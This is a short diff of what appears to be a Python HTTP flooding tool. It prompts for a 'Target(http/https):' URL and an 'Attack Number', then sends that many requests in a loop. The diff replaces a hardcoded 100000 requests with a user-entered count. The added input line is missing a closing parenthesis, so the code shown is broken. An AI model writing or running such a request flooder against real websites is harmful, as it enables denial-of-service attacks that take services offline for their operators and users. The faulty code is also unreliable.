@@ -17,10 +17,10 @@ def proceed():
 
             target_url = input("Target(http/https):")
             print("Wait For Access")
+
+            num_requests = int(input("Attack Number:")
             time.sleep(1)
             print("Enjoy")
-
-            num_requests = 100000
 
             def send_request():
                 for _ in range(num_requests):
